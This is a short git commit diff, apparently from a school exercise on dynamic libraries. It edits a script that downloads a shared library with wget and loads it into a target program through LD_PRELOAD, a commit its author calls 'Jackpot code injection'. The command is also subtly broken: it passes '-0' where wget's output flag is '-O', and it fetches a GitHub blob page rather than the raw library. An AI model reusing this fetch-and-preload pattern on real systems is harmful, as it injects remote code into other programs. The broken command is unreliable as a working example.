ce96b806c38ecfbb05e078a25850c65bd8fe89a8
jzamora5 <jzamora_5@yahoo.com>
2019-12-16 17:26:22 +0000

    Jackpot code injection

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -q -0 /jackpot.so https://github.com/jzamora5/holbertonschool-low_level_programming/blob/master/0x18-dynamic_libraries/jackpot.so
-export LD_PRELOAD=/jackpot.so
+wget -q -0 /tmp/jackpot.so https://github.com/jzamora5/holbertonschool-low_level_programming/blob/master/0x18-dynamic_libraries/jackpot.so
+export LD_PRELOAD=/tmp/jackpot.so
